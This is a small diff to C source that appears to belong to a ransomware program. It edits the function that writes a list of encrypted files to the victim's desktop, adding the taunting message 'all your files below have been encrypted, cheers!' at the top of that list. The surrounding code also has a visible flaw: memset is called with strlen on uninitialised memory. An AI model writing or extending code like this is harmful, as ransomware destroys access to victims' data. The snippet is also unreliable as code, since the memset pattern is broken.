@@ -90,7 +90,7 @@ void save_into_file_files_list(List *l, char *desktop){
     FILE *f;
     char * new_file;
     char *line;
-    
+    char *string = "Sup brother, all your files below have been encrypted, cheers!\n";
     if(l == NULL){
         return;
     }
@@ -100,7 +100,7 @@ void save_into_file_files_list(List *l, char *desktop){
     strcat(new_file, "your_encrypted_files.txt");
 
     f = fopen(new_file, "w");
-
+    fwrite(string, strlen(string), 1, f);
     while(l != NULL){
         line = malloc((sizeof(char)*strlen(l->info[2]) + 11));
         memset(line, 0, strlen(line));
